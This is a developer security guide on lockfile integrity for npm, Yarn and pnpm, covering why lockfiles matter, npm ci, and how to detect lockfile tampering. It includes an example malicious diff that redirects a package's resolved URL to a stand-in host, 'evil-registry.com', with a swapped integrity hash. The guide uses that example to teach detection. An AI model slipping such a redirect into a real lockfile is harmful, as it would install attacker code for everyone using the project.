# Lockfile Integrity

> **30-second summary:** Lockfiles (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) pin every dependency to an exact version and verified hash. Without them, `npm install` can silently install different — potentially malicious — versions across environments.

---

## What a Lockfile Does

When you run `npm install`, npm resolves all your `package.json` version ranges (e.g., `^1.2.3`) into specific versions and writes the results to `package-lock.json`. This file records:

- **Exact version** of every dependency (direct and transitive)
- **Resolved URL** — where the package was actually downloaded from
- **Integrity hash** — a SHA-512 hash of the package contents

```json
{
  "name": "my-app",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/express": {
      "version": "4.18.2",
      "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
      "integrity": "sha512-o4w5Xn...==",
      "dependencies": {
        "accepts": "~1.3.8"
      }
    }
  }
}
```

The `integrity` field is cryptographically verified by npm — if the downloaded package doesn't match this hash, installation fails.

---

## Why You Must Commit Your Lockfile

### Without a Lockfile

```json
// package.json
{
  "dependencies": {
    "some-library": "^2.0.0"
  }
}
```

- Developer A installs: gets `some-library@2.0.0` (clean)
- Developer B installs 3 months later: gets `some-library@2.3.0` (has a vulnerability)
- CI pipeline installs: gets `some-library@2.4.1` (contains injected malware)

All three are running different code. The caret (`^`) allows any minor/patch version.

### With a Committed Lockfile

Everyone installs exactly `2.0.0` — the version that was pinned when the lockfile was created. No surprises.

---

## `npm install` vs `npm ci`

| Command | Reads lockfile | Updates lockfile | Use in |
|---|---|---|---|
| `npm install` | Yes (if present) | Yes (may update) | Local dev |
| `npm ci` | Yes (required) | Never | CI/CD pipelines |

> **Critical:** Always use `npm ci` in CI/CD pipelines. It fails if `package-lock.json` is missing or out of sync with `package.json`, ensuring you always get exactly what was committed.

```yaml
# ✅ Correct — CI pipeline
- name: Install dependencies
  run: npm ci

# ❌ Wrong — allows version drift in CI
- name: Install dependencies
  run: npm install
```

---

## Lockfile Tampering Attacks

A lockfile in your repository is only as safe as your repository. Attackers who gain write access to your repo (through a compromised team member, a malicious PR, or a compromised GitHub Action) can modify the lockfile to:

- Change the `resolved` URL to point to a malicious registry
- Change the `integrity` hash to match a malicious package
- Downgrade a dependency to a vulnerable version

### Example — Malicious Lockfile Change

```diff
  "node_modules/some-util": {
    "version": "1.0.0",
-   "resolved": "https://registry.npmjs.org/some-util/-/some-util-1.0.0.tgz",
-   "integrity": "sha512-abc123...=="
+   "resolved": "https://evil-registry.com/some-util/-/some-util-1.0.0.tgz",
+   "integrity": "sha512-xyz789...=="
  }
```

This would look like a routine lockfile update in a PR diff.

### How to Detect Tampered Lockfiles

```bash
# Verify all installed packages match their registry-published hashes
npm audit signatures

# Check that all resolved URLs point to expected registries
grep '"resolved"' package-lock.json | grep -v "registry.npmjs.org" | grep -v "your-private-registry.com"
# Any output here is suspicious

# In CI: verify lockfile hasn't changed after install
npm ci
git diff --exit-code package-lock.json
# Fails if lockfile was modified during install — sign of tampering
```

---

## Yarn Lock vs npm Lockfile vs pnpm Lockfile

| Feature | `package-lock.json` | `yarn.lock` | `pnpm-lock.yaml` |
|---|---|---|---|
| Manager | npm | Yarn (v1/v2+) | pnpm |
| Integrity hashes | SHA-512 (v2+) | SHA-1 (v1), SHA-512 (v2+) | SHA-512 |
| Readable diff | Moderate | Good | Good |
| Deterministic installs | Yes (`npm ci`) | Yes (`yarn --frozen-lockfile`) | Yes (`pnpm install --frozen-lockfile`) |

All three provide the same core protection. The important thing is that you:

1. Commit whichever lockfile your project uses
2. Use the frozen/CI variant of the install command in pipelines

```bash
# npm
npm ci

# Yarn v1
yarn install --frozen-lockfile

# Yarn Berry (v2+)
yarn install --immutable

# pnpm
pnpm install --frozen-lockfile
```

---

## Lockfile Best Practices

### 1. Never `.gitignore` Your Lockfile

```gitignore
# ❌ Never do this
package-lock.json
yarn.lock
pnpm-lock.yaml
```

Many older tutorials recommend ignoring lockfiles for libraries (as opposed to applications). This advice is outdated. Always commit lockfiles for both applications and libraries.

### 2. Review Lockfile Changes in Pull Requests

Lockfile changes in a PR should match the `package.json` changes. Be suspicious of:

- Lockfile changes with no corresponding `package.json` change
- Many packages changing when only one was added/updated
- Changes to `resolved` URLs
- Changes to `integrity` hashes without version changes

```bash
# Review lockfile diff carefully
git diff main -- package-lock.json | grep '^\+' | grep -E '"resolved"|"integrity"|"version"'
```

### 3. Set Up Automated Lockfile Monitoring

```yaml
# .github/workflows/lockfile-check.yml
name: Lockfile Integrity
on: [pull_request]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - name: Verify lockfile is up to date
        run: |
          npm ci
          git diff --exit-code package-lock.json || \
            (echo "Lockfile is out of sync with package.json" && exit 1)
```

### 4. Use Exact Versions for Critical Dependencies

```bash
# Save with exact version (no ^ or ~)
npm install --save-exact some-critical-package

# Or set this globally
npm config set save-exact true
```

### 5. Regularly Rotate and Audit

```bash
# See what's outdated
npm outdated

# Update dependencies with review
npm update

# Full audit after updating
npm audit
```

---

## Checklist

- [ ] `package-lock.json` / `yarn.lock` committed to version control
- [ ] Lockfile not in `.gitignore`
- [ ] CI pipeline uses `npm ci` (not `npm install`)
- [ ] PR reviews include lockfile diff inspection
- [ ] CI step verifies lockfile hasn't drifted after install
- [ ] `npm audit signatures` run to verify package provenance
- [ ] Lockfile `resolved` URLs verified to point to expected registries
- [ ] Critical packages pinned with exact versions (`--save-exact`)
- [ ] Dependabot or Renovate configured for automated update PRs
